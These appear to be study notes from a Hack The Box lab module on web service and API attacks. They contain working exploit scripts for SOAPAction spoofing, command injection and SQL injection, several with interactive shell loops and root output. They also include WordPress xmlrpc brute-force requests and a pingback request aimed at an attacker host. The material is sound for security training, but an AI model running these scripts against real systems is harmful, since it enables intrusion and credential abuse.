# Web Service & API Attacks

# Introduction to Web Services and APIs

### Definition

- **Web Services** (W3C): A standard way for different software applications to interoperate across platforms/frameworks using **XML**.
    - **Interoperability**: Applications in different languages/platforms can communicate (e.g., Java on Linux with Oracle DB and C++ on Windows with SQL Server).
- **API (Application Programming Interface)**: A set of rules enabling data transmission between software. APIs specify how data/functions are exchanged.

### Key Differences: Web Services vs. APIs

| Aspect | Web Services | APIs |
| --- | --- | --- |
| **Definition** | A type of API | Broader concept |
| **Network Dependency** | Requires a network | Can work offline |
| **Developer Access** | Limited external developer access | Often open for external developers |
| **Protocols** | Commonly SOAP | REST, JSON-RPC, SOAP, etc. |
| **Data Formats** | Primarily XML | JSON, XML, etc. |

---

## Web Service Approaches/Technologies

### **XML-RPC**

- Encodes requests/responses in **XML -** uses HTTP as the transport.
- Structure:
    - `<methodCall>` contains `<methodName>` and `<params>` (if required).
- **Example Code**:
    
    ```php
      --> POST /RPC2 HTTP/1.0
      User-Agent: Frontier/5.1.2 (WinNT)
      Host: betty.userland.com
      Content-Type: text/xml
      Content-length: 181
    
      <?xml version="1.0"?>
      <methodCall>
        <methodName>examples.getStateName</methodName>
        <params>
           <param>
     		     <value><i4>41</i4></value>
     		     </param>
    		  </params>
        </methodCall>
    
      <-- HTTP/1.1 200 OK
      Connection: close
      Content-Length: 158
      Content-Type: text/xml
      Date: Fri, 17 Jul 1998 19:55:08 GMT
      Server: UserLand Frontier/5.1.2-WinNT
    
      <?xml version="1.0"?>
      <methodResponse>
         <params>
            <param>
    		      <value><string>South Dakota</string></value>
    		      </param>
      	    </params>
       </methodResponse>
    ```
    

---

### **JSON-RPC**

- Encodes requests/responses in **JSON -** uses HTTP as the transport.
- Structure:
    - `method`: Name of the invoked function.
    - `params`: Arguments passed to the function.
    - `id`: Unique identifier for the request.
- **Example Code**:
    
    ```php
      --> POST /ENDPOINT HTTP/1.1
       Host: ...
       Content-Type: application/json-rpc
       Content-Length: ...
    
      {"method": "sum", "params": {"a":3, "b":4}, "id":0}
    
      <-- HTTP/1.1 200 OK
       ...
       Content-Type: application/json-rpc
    
       {"result": 7, "error": null, "id": 0}
    ```
    
    The server must reply with the same value in the response object if included.
    

---

### **SOAP (Simple Object Access Protocol)**

- Encodes requests/responses in **XML**; adds functionalities like headers and fault handling.
- Key Elements:
    - `soap:Envelope`: Differentiates SOAP from normal XML. (required)
    - `soap:Header`: Optional for extensibility.
    - `soap:Body`: Contains the procedure, parameters, and data. (required)
    - `soap:Fault`: Optional for error handling.
- **Example Code**:
    
    ```xml
      --> POST /Quotation HTTP/1.0
      Host: www.xyz.org
      Content-Type: text/xml; charset = utf-8
      Content-Length: nnn
    
      <?xml version = "1.0"?>
      <SOAP-ENV:Envelope
        xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
         SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">
    
        <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotations">
           <m:GetQuotation>
             <m:QuotationsName>MiscroSoft</m:QuotationsName>
          </m:GetQuotation>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    
      <-- HTTP/1.0 200 OK
      Content-Type: text/xml; charset = utf-8
      Content-Length: nnn
    
      <?xml version = "1.0"?>
      <SOAP-ENV:Envelope
       xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
        SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">
    
      <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotation">
      	  <m:GetQuotationResponse>
      	     <m:Quotation>Here is the quotation</m:Quotation>
         </m:GetQuotationResponse>
       </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    ```
    

---

### **RESTful (Representational State Transfer)**

- Uses **HTTP verbs** to access/modify resources.
- Data Formats: Commonly JSON or XML.
- Example 1 (XML):
    
    ```xml
      --> POST /api/2.2/auth/signin HTTP/1.1
      HOST: my-server
      Content-Type:text/xml
    
      <tsRequest>
        <credentials name="administrator" password="passw0rd">
          <site contentUrl="" />
        </credentials>
      </tsRequest>
    ```
    
- Example 2 (JSON):
    
    ```json
      --> POST /api/2.2/auth/signin HTTP/1.1
      HOST: my-server
      Content-Type:application/json
      Accept:application/json
    
      {
       "credentials": {
         "name": "administrator",
        "password": "passw0rd",
        "site": {
          "contentUrl": ""
         }
        }
      }
    ```
    

---

## Similar Protocols

- **RPC**: Remote Procedure Call.
- **SOAP**: Complex XML-based API protocol.
- **REST**: HTTP-based; relies on resources and verbs.
- **gRPC**: High-performance RPC framework.
- **GraphQL**: Flexible query language for APIs.

---

# **Web Services Description Language (WSDL)**

### **Overview**

- **Definition**: WSDL is an **XML-based file** that defines a web service, including:
    - Available services/methods.
    - Method-calling conventions.
    - Location of the service.
- **Security Note**:
    - WSDL files are not always publicly exposed.
    - Developers may use obscure paths or parameters for security purposes.
    - **Discovery Tools**: Directory fuzzing (e.g., `dirb`, `ffuf`) can identify WSDL files.
        
        ```bash
        dirb http://<TARGET IP>:3002
        ----------
        ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
        ```
        
        - Example of what we can find :
        
        ```xml
        curl http://<TARGET IP>:3002/wsdl?wsdl 
        
        <?xml version="1.0" encoding="UTF-8"?>
        <wsdl:definitions targetNamespace="http://tempuri.org/"
        	xmlns:s="http://www.w3.org/2001/XMLSchema"
        	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
        	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
        	xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
        	xmlns:tns="http://tempuri.org/"
        	xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
        	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
        	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
        	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
        	<wsdl:types>
        		<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
        			<s:element name="LoginRequest">
        				<s:complexType>
        					<s:sequence>
        						<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
        						<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
        					</s:sequence>
        				</s:complexType>
        			</s:element>
        			<s:element name="LoginResponse">
        				<s:complexType>
        					<s:sequence>
        						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
        					</s:sequence>
        				</s:complexType>
        			</s:element>
        			<s:element name="ExecuteCommandRequest">
        				<s:complexType>
        					<s:sequence>
        						<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
        					</s:sequence>
        				</s:complexType>
        			</s:element>
        			<s:element name="ExecuteCommandResponse">
        				<s:complexType>
        					<s:sequence>
        						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
        					</s:sequence>
        				</s:complexType>
        			</s:element>
        		</s:schema>
        	</wsdl:types>
        	<!-- Login Messages -->
        	<wsdl:message name="LoginSoapIn">
        		<wsdl:part name="parameters" element="tns:LoginRequest"/>
        	</wsdl:message>
        	<wsdl:message name="LoginSoapOut">
        		<wsdl:part name="parameters" element="tns:LoginResponse"/>
        	</wsdl:message>
        	<!-- ExecuteCommand Messages -->
        	<wsdl:message name="ExecuteCommandSoapIn">
        		<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
        	</wsdl:message>
        	<wsdl:message name="ExecuteCommandSoapOut">
        		<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
        	</wsdl:message>
        	<wsdl:portType name="HacktheBoxSoapPort">
        		<!-- Login Operaion | PORT -->
        		<wsdl:operation name="Login">
        			<wsdl:input message="tns:LoginSoapIn"/>
        			<wsdl:output message="tns:LoginSoapOut"/>
        		</wsdl:operation>
        		<!-- ExecuteCommand Operation | PORT -->
        		<wsdl:operation name="ExecuteCommand">
        			<wsdl:input message="tns:ExecuteCommandSoapIn"/>
        			<wsdl:output message="tns:ExecuteCommandSoapOut"/>
        		</wsdl:operation>
        	</wsdl:portType>
        	<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
        		<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
        		<!-- SOAP Login Action -->
        		<wsdl:operation name="Login">
        			<soap:operation soapAction="Login" style="document"/>
        			<wsdl:input>
        				<soap:body use="literal"/>
        			</wsdl:input>
        			<wsdl:output>
        				<soap:body use="literal"/>
        			</wsdl:output>
        		</wsdl:operation>
        		<!-- SOAP ExecuteCommand Action -->
        		<wsdl:operation name="ExecuteCommand">
        			<soap:operation soapAction="ExecuteCommand" style="document"/>
        			<wsdl:input>
        				<soap:body use="literal"/>
        			</wsdl:input>
        			<wsdl:output>
        				<soap:body use="literal"/>
        			</wsdl:output>
        		</wsdl:operation>
        	</wsdl:binding>
        	<wsdl:service name="HacktheboxService">
        		<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
        			<soap:address location="http://localhost:80/wsdl"/>
        		</wsdl:port>
        	</wsdl:service>
        </wsdl:definitions>
        ```
        

---

## **WSDL File Breakdown ( ^ Version 1.1 )**

### 1. **Definition**

- Root element containing:
    - Name of the web service.
    - Namespace declarations.
    - All service components.
- **Example**:
    
    ```xml
    <wsdl:definitions targetNamespace="http://tempuri.org/">
      <wsdl:types></wsdl:types>
      <wsdl:message name="LoginSoapIn"></wsdl:message>
      <wsdl:portType name="HacktheBoxSoapPort">
        <wsdl:operation name="Login"></wsdl:operation>
      </wsdl:portType>
      <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
        <wsdl:operation name="Login">
          <soap:operation soapAction="Login" style="document"/>
        </wsdl:operation>
      </wsdl:binding>
      <wsdl:service name="HacktheboxService"></wsdl:service>
    </wsdl:definitions>
    
    ```
    

### 2. **Data Types**

- Defines data structures used in service interactions.
- Encoded in `<wsdl:types>`.
- **Example**:
    
    ```xml
    <wsdl:types>
        <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      	  <s:element name="LoginRequest">
      		  <s:complexType>
      			  <s:sequence>
      				  <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
      				  <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
      			  </s:sequence>
      		  </s:complexType>
      	  </s:element>
      	  <s:element name="LoginResponse">
      		  <s:complexType>
      			  <s:sequence>
      				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
      			  </s:sequence>
      		  </s:complexType>
      	  </s:element>
      	  <s:element name="ExecuteCommandRequest">
      		  <s:complexType>
      			  <s:sequence>
      				  <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
      			  </s:sequence>
      		  </s:complexType>
      	  </s:element>
      	  <s:element name="ExecuteCommandResponse">
      		  <s:complexType>
      			  <s:sequence>
      				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
      			  </s:sequence>
      		  </s:complexType>
      	  </s:element>
        </s:schema>
    </wsdl:types>
    ```
    

### 3. **Messages**

- Defines the **input** and **output** messages exchanged.
- **Example**:
    
    ```xml
    <!-- Login Messages -->
    <wsdl:message name="LoginSoapIn">
        <wsdl:part name="parameters" element="tns:LoginRequest"/>
    </wsdl:message>
    <wsdl:message name="LoginSoapOut">
        <wsdl:part name="parameters" element="tns:LoginResponse"/>
    </wsdl:message>
    <!-- ExecuteCommand Messages -->
    <wsdl:message name="ExecuteCommandSoapIn">
        <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
    </wsdl:message>
    <wsdl:message name="ExecuteCommandSoapOut">
        <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
    </wsdl:message>
    ```
    

### 4. **Port Type**

- Groups **operations** (methods) and their corresponding messages.
- Acts as the interface for the web service.
- **Example**:
    
    ```xml
    <wsdl:portType name="HacktheBoxSoapPort">
        <!-- Login Operaion | PORT -->
        <wsdl:operation name="Login">
      	  <wsdl:input message="tns:LoginSoapIn"/>
      	  <wsdl:output message="tns:LoginSoapOut"/>
        </wsdl:operation>
        <!-- ExecuteCommand Operation | PORT -->
        <wsdl:operation name="ExecuteCommand">
      	  <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      	  <wsdl:output message="tns:ExecuteCommandSoapOut"/>
        </wsdl:operation>
    </wsdl:portType>
    ```
    

### 5. **Binding**

- Specifies the protocol (e.g., SOAP, HTTP) and message format.
- **Example**:
    
    ```xml
    <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
        <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
        <!-- SOAP Login Action -->
        <wsdl:operation name="Login">
      	  <soap:operation soapAction="Login" style="document"/>
      	  <wsdl:input>
      		  <soap:body use="literal"/>
      	  </wsdl:input>
      	  <wsdl:output>
      		  <soap:body use="literal"/>
      	  </wsdl:output>
        </wsdl:operation>
        <!-- SOAP ExecuteCommand Action -->
        <wsdl:operation name="ExecuteCommand">
      	  <soap:operation soapAction="ExecuteCommand" style="document"/>
      	  <wsdl:input>
      		  <soap:body use="literal"/>
      	  </wsdl:input>
      	  <wsdl:output>
      		  <soap:body use="literal"/>
      	  </wsdl:output>
        </wsdl:operation>
    </wsdl:binding>
    ```
    

### 6. **Service**

- Defines the **service name** and **location** (e.g., endpoint URL).
- **Example**:
    
    ```xml
        <wsdl:service name="HacktheboxService">
    
          <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
            <soap:address location="http://localhost:80/wsdl"/>
          </wsdl:port>
    
        </wsdl:service>
    ```
    

---

### **Practical Notes**

- **WSDL Discovery**:
    - WSDL files can be located at paths like `/wsdl`, `?wsdl`, `/example.wsdl`.
    - Use fuzzing tools like `dirb` and `ffuf` to locate them.
- **DISCO Files**:
    - Microsoft technology for service discovery.
    - Similar to WSDL but focuses on discovering related web services.

---

# Web Service Attacks

## **SOAPAction Spoofing**

### **Overview**

- **SOAPAction Header**: Used in HTTP requests to specify the operation to execute in a SOAP service.
- **Spoofing Vulnerability**: If the SOAP service relies solely on the `SOAPAction` header without validating the SOAP body, it can be tricked into executing unauthorized operations.

---

### **Identified Vulnerability**

1. The service WSDL reveals two operations: `Login` and `ExecuteCommand`.
2. The `ExecuteCommand` operation includes a `cmd` parameter to execute commands but is restricted to internal networks.
3. The `Login` operation is allowed externally.

---

### **Exploitation Steps**

### 1. **Basic Command Execution Attempt**

- **Goal**: Use `ExecuteCommand` to execute `whoami`.
- **Script**:
    
    ```python
    import requests
    
    payload = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:tns="http://tempuri.org/"
                   xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
      <soap:Body>
        <ExecuteCommandRequest xmlns="http://tempuri.org/">
          <cmd>whoami</cmd>
        </ExecuteCommandRequest>
      </soap:Body>
    </soap:Envelope>'''
    
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload,
                        headers={"SOAPAction": '"ExecuteCommand"'}).content)
    
    ```
    
- **Result**:
    
    ```bash
    python3 client.py
    b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
    ```
    
    We get an error mentioning *This function is only allowed in internal networks*. We have no access to the internal networks. Does this mean we are stuck? Not yet! Let us try a SOAPAction spoofing attack, as follows.
    

### 2. **SOAPAction Spoofing**

- **Technique**:
    - Specify the `Login` operation in the SOAP body (allowed externally).
    - Use the `ExecuteCommand` operation in the `SOAPAction` header to trick the service into executing the restricted operation.
- **Script**:
    
    ```python
    import requests
    
    payload = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:tns="http://tempuri.org/"
                   xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
      <soap:Body>
        <LoginRequest xmlns="http://tempuri.org/">
          <cmd>whoami</cmd>
        </LoginRequest>
      </soap:Body>
    </soap:Envelope>'''
    
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload,
                        headers={"SOAPAction": '"ExecuteCommand"'}).content)
    
    ```
    
    - We specify `*LoginRequest*`in `<soap:Body>`, so that our request goes through. This operation is allowed from the outside.
    - We specify the parameters of **`*ExecuteCommand*`** because we want to have the SOAP service execute a `whoami` command.
    - We specify the blocked operation (**`*ExecuteCommand*`**) in the SOAPAction header
- **Result**:
    
    ```bash
    python3 client.py
    /home/darksidedani/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
      warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
    b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'
    -----
    <result>root</result>
    ```
    
    If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a `whoami` command.
    

---

### **Automated Exploitation**

- To execute multiple commands interactively:
    
    ```python
    import requests
    
    while True:
        cmd = input("$ ")
        payload = f'''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:tns="http://tempuri.org/"
                       xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
          <soap:Body>
            <LoginRequest xmlns="http://tempuri.org/">
              <cmd>{cmd}</cmd>
            </LoginRequest>
          </soap:Body>
        </soap:Envelope>'''
    
        print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload,
                            headers={"SOAPAction": '"ExecuteCommand"'}).content)
    ```
    
- **Execution**:
    
    ```
    $ python3 automate.py
    $ id
    <result>uid=0(root) gid=0(root) groups=0(root)</result>
    ```
    

---

### **Key Points**

- The spoofing attack works because the SOAP service relies on the `SOAPAction` header rather than parsing the SOAP body.
- This allows bypassing restrictions and executing unauthorized commands.

### Another example:

![image.png](image%20165.png)

```bash
<wsdl:definitions targetNamespace="http://tempuri.org/">
<wsdl:types>
<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
<s:element name="LoginRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

Will need to specify `LoginRequest` within `<soap:Body>`, provide a SQLi that will allow users to login as `admin`, such as `admin' --` as the value for the `<username>` parameter, and provide any dummy password as value for the `<password>` parameter. Students need to use the following Python script to trigger the SQLi vulnerability of the service

```bash
import requests

payload = "admin' --"
data = f'<?xml version="1.0" encoding="UTF-8"?> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:tns="http://tempuri.org/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <soap:Body> <LoginRequest xmlns="http://tempuri.org/"> <username>{payload}</username> <password>fff</password> </LoginRequest> </soap:Body> </soap:Envelope>'

print(requests.post("http://STMIP:3002/wsdl", data=data, headers={"SOAPAction":'"Login"'}).content)
```

```bash
python3 sqli.py

┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@htb-q7l0dpr4ul]─[~]
└──╼ [★]$ python3 sqli.py

b'<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
	xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:tns="http://tempuri.org/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
	<soap:Body>
		<LoginResponse
			xmlns="http://tempuri.org/">
			<id>0</id>
			<name>Administrator</name>
			<email>admin@htb.net</email>
			<username>admin</username>
			<password>FLAG{1337_SQL_INJECTION_IS_FUN_:)}</password>
		</LoginResponse>
	</soap:Body>
</soap:Envelope>'
```

---

## **Command Injection in Web Services**

Command injection vulnerabilities occur when user-controlled input is executed as part of a system command on the back-end server. This allows attackers to manipulate the command and potentially execute arbitrary commands on the server.

---

### **Analyzing the Vulnerable Web Service**

**`http://<TARGET IP>:3003/ping-server.php/ping`**

### **Provided Service Code**

```bash
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

The service includes the following elements:

1. **Function `ping`**:
    - Accepts `host_url_ip` and `packets` as arguments.
    - Constructs the command using:
        
        ```php
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        ```
        
    - The request should look similar to the following. **`http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`.** To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request.
    
    ```bash
    sudo tcpdump -i tun0 icmp            
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    20:01:52.978016 IP 10.129.226.18 > 10.10.15.130: ICMP echo request, id 2, seq 1, length 64
    20:01:52.978039 IP 10.10.15.130 > 10.129.226.18: ICMP echo reply, id 2, seq 1, length 64
    20:01:53.980206 IP 10.129.226.18 > 10.10.15.130: ICMP echo request, id 2, seq 2, length 64
    20:01:53.980229 IP 10.10.15.130 > 10.129.226.18: ICMP echo reply, id 2, seq 2, length 64
    20:01:54.982016 IP 10.129.226.18 > 10.10.15.130: ICMP echo request, id 2, seq 3, length 64
    20:01:54.982032 IP 10.10.15.130 > 10.129.226.18: ICMP echo reply, id 2, seq 3, length 64
    ```
    
2. **Key Observations**:
    - The `packets` parameter is validated to allow only values `1-4`.
    - A variable called *cmd* is then created, which forms the ping command to be executed. Two values are "parsed", *packets* and *host_url*. [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) is used to escape the *host_url*'s value. According to PHP's function reference, *escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() shell_exec() and the backtick operator.* If the *host_url*'s value was not escaped, the below could happen.
    
    ![image.png](image%20166.png)
    
    - If the request method is GET, an existing function can be called with the help of [call_user_func_array()](https://www.php.net/manual/en/function.call-user-func-array.php). The *call_user_func_array()* function is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3` an attacker could issue a request as follows. `http://<TARGET IP>:3003/ping-server.php/system/ls`. This constitutes a command injection vulnerability!

---

### **Exploit Command Injection**

- To execute commands featuring arguments via **`http://10.129.226.18:3003/ping-server.php/system/{the command here}` we have to URL encode them.**

```bash
curl http://10.129.226.18:3003/ping-server.php/system/cd .. && ls
curl: (6) Could not resolve host: ..
------
#
------                        
curl http://10.129.226.18:3003/ping-server.php/system/cd%20..%20%26%26%20ls
nodejs
php
php-sqli
soap-wsdl
```

1. **Injecting Through Function Name**:
    - Direct the service to call the `system` function:
        
        ```bash
        curl http://<TARGET IP>:3003/ping-server.php/system/ls
        #
        index.php
        ping-server.php
        ```
        
2. **Execute Arbitrary Commands**:
    - To gain more information about the system:
        
        ```bash
        curl http://<TARGET IP>:3003/ping-server.php/system/whoami
        #
        www-data
        ```
        
3. **Interactive Exploit Using Python**:
    - Automate arbitrary command execution:
        
        ```python
        import requests
        
        while True:
            cmd = input("$ ")
            url = f"http://<TARGET IP>:3003/ping-server.php/system/{cmd}"
            response = requests.get(url)
            print(response.text)
        ```
        
    - **Execution**:
        
        ```bash
        $ python3 exploit.py
        $ id
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        ```
        

---

### **Key Takeaways**

- **Root Cause**:
    - The service allows dynamic function calls via `call_user_func_array()`.
    - It lacks input validation for the function name, enabling attackers to invoke sensitive functions like `system`.
- **Mitigation**:
    1. Restrict allowed functions to a predefined whitelist.
    2. Validate and sanitize all user inputs thoroughly.
    3. Use secure APIs instead of shell commands (`exec`, `system`, etc.).

---

## **Attacking WordPress `xmlrpc.php`**

### **Overview**

- **`xmlrpc.php`** is a core WordPress file that facilitates remote access through XML-RPC (Remote Procedure Call) protocol.
- While not inherently a vulnerability, its enabled status can facilitate enumeration, brute force attacks, and other exploitative activities.

---

### **Identifying if `xmlrpc.php` is Enabled**

- Simply send a request to `/xmlrpc.php`:
    
    ```bash
    curl -s -X POST -d "<methodCall></methodCall>" http://<DOMAIN>/xmlrpc.php
    ```
    
- A response indicates that the file is enabled.

---

**Brute-Forcing Passwords via `xmlrpc.php`**

- Use the `wp.getUsersBlogs` method to validate credentials.

Suppose we are assessing the security of a WordPress instance residing in *http://blog.inlanefreight.com*. Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is enabled. Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

### **Successful Login Example**

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

### **Failed Login Example**

```bash
DarkSideDani@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

---

### **Enumerating Available Methods**

- Use the `system.listMethods` method to enumerate available methods.

```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

**Response**:

- Lists available XML-RPC methods (e.g., `wp.getUsersBlogs`, `pingback.ping`, etc.).

---

### **Exploiting the `pingback.ping` Method**

### **Overview**

Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, *a [pingback](https://wordpress.com/support/comments/pingbacks/) is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.*

- The `pingback.ping` method is used for generating pingbacks.
- Exploitable scenarios:
    - **IP Disclosure**: Identify the public IP of a WordPress instance protected by a service like Cloudflare.
    - **Cross-Site Port Attack (XSPA)**: Probe internal or external ports.
    - **DDoS**: Direct multiple WordPress instances to attack a target.

### **If pingbacks are available it can facilitate:**

- IP Disclosure - An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- Cross-Site Port Attack (XSPA) - An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
- Distributed Denial of Service Attack (DDoS) - An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

IP Disclosure attack could be mounted if `xmlrpc.php` is enabled and the `pingback.ping` method is available. XSPA and DDoS attacks can be mounted similarly.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from *http://blog.inlanefreight.com*, verifying the pingback and exposing *http://blog.inlanefreight.com*'s public IP address.

```bash
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```

---

### **Mitigation**

1. **Disable `xmlrpc.php` if not required**:
    - Use `.htaccess` or the WordPress `disable-xmlrpc` plugin.
    - Example `.htaccess` rule:
        
        ```
        <Files xmlrpc.php>
            Order Deny,Allow
